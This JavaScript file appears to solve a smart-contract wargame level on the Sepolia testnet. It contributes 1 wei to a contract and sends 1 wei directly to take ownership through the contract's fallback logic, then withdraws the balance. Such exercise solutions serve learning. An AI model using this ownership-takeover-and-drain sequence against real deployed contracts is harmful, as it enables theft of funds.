const contractAbi = require('./contractAbi.json');
const { ethers } = require('hardhat');
require('dotenv').config();


const privateKey = process.env.MNEMONIC;
const rpcUrl = `https://sepolia.infura.io/v3/${encodeURIComponent(process.env.INFURA_API_KEY)}`;

const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
const signer = new ethers.Wallet(privateKey, provider);
const contractAddress = '0x9B28deE1dbD5eA2995EDd79c93fa74a282575B26';

// Get the contract instance;
const contract = new ethers.Contract(contractAddress, contractAbi, signer);


async function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function function1() {
  // Code for function 1
  const weiAmount = ethers.BigNumber.from(1);
  await contract.contribute({ value: weiAmount });
  console.log('Contract Owner:', await contract.owner());
  console.log("Function 1 executed");
}

async function function2() {
   // Send 1 wei to the recipient
   const weiAmount = ethers.utils.parseUnits('1', 'wei');
   const tx = await signer.sendTransaction({
     to: contractAddress,
     value: weiAmount
   });
 
   console.log(`Transaction sent. Transaction hash: ${tx.hash}`);
 
   console.log('Contract Owner:', await contract.owner());
  console.log("Function 2 executed");
}

async function function3() {
await contract.withdraw();
  console.log("Function 3 executed");

}

async function executeFunctions() {
  await function1();
  await delay(5000); // Wait for 5 seconds
  await function2();
  await delay(5000); // Wait for 5 seconds
  await function2();
  await delay(3000); // Wait for 3 seconds
  await function3();
}

executeFunctions();
